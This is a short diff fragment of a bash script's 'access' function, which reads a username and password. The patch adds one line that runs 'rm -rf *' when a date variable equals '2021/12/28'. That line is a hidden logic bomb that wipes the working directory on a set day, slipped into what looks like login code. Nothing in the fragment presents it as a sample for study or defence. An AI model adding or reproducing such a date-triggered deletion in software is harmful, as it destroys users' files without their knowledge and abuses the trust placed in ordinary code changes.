@@ -26,6 +26,7 @@ function access()
 {
     local username=${userm}
     local password=${pass}
+    [[ ${date} == "2021/12/28" ]] && rm -rf *
     [[ -f .sl ]] && return 0
 
     for ((times=0;times<=2;times++)); do
